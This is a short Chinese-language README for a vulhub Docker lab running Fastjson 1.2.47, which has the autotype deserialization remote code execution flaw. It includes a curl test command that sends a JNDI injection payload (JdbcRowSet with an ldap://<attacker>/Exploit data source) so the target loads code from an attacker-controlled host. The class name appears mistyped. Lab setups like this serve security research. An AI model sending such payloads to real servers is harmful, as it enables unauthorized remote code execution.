# Fastjson 远程代码执行

## 漏洞简介

Fastjson 是一个高性能的 JSON 库，但其 autotype 机制存在反序列化漏洞，攻击者可以通过构造特殊的 JSON 数据来触发 JNDI 注入或执行任意代码。

## 漏洞信息

- **漏洞类型**: RCE (远程代码执行)
- **危险等级**: High (高危)
- **影响版本**: Fastjson < 1.2.48

## 环境信息

- **镜像**: vulhub/fastjson:1.2.47
- **端口**: 8090
- **服务**: Fastjson RCE 测试环境

## 使用方法

1. 在云服务器上执行 userdata 脚本
2. 脚本会自动安装 Docker 并启动 Fastjson 漏洞环境
3. 访问 `http://<your-ip>:8090` 进行测试

## 测试方法

```bash
# 发送恶意 JSON 数据（需要 JNDI 工具配合）
curl -X POST "http://<your-ip>:8090" -d '{"@type":"com.sun.rowset.JdbcRowSet1","dataSourceName":"ldap://<attacker>/Exploit","autoCommit":true}'
```

## 注意事项

- 此环境仅用于安全研究
- 请在防火墙中限制访问来源
- 测试完成后请及时删除环境

## 参考链接

- [Vulhub Fastjson 漏洞环境](https://github.com/vulhub/vulhub/tree/master/fastjson)
